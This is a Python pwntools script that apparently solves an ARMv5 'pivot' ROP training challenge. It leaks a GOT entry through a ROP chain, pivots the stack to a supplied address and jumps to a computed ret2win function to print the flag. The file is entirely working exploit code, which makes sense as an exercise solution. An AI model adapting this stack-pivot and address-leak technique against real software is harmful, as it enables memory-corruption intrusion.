#!/usr/bin/python3
from pwn import process, p32, u32, log

shell = process("./pivot_armv5")

offset = 36
junk = b"A" * offset

shell.recvuntil(b"pivot: ")
pivot = int(shell.recvline().strip(), 16)

pop_r3 = p32(0x105d4)
pop_fp = p32(0x10810)
sub_sp_pop_fp = p32(0x1080c)
mov_r0_r7_blx_r3 = p32(0x10974)

foothold_plt = p32(0x1064c)
foothold_got = p32(0x2102c)
puts = p32(0x10610)
main = p32(0x1076C)

payload  = b""
payload += p32(pivot)
payload += foothold_plt
payload += p32(0) * 3
payload += foothold_got
payload += p32(0) * 3
payload += pop_r3 + puts
payload += mov_r0_r7_blx_r3
payload += p32(0) * 7
payload += main

shell.sendlineafter(b"> ", payload)

payload  = b""
payload += junk
payload += pop_fp + p32(pivot + 0x4)
payload += sub_sp_pop_fp

shell.sendlineafter(b"> ", payload)

shell.recvuntil(b'libpivot\n')

ret2win = u32(shell.recvline()[:4]) + 0x18c

payload  = b""
payload += junk
payload += p32(ret2win)

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
